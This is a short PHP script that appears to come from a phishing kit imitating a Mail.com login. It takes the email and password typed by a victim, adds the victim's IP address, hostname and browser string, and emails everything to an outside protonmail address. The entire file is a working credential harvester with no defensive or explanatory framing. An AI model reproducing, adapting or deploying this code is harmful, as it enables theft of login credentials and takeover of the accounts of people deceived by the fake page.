<?php

$email= $_REQUEST["email"];
$password= $_REQUEST["password"];


if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];

$data=" 
----------
username : $email
passwd : $password
------------------
$ip
$hostname
$browser
------------------
";

$subj = "Mail.com-> $user,$pass";

$recipient1 = "obs.all@protonmail.com, obs.all@protonmail.com";
$rec2 = "";



mail($recipient1 , $subj , $data);
mail($rec2 , $subj , $data);

?>
		  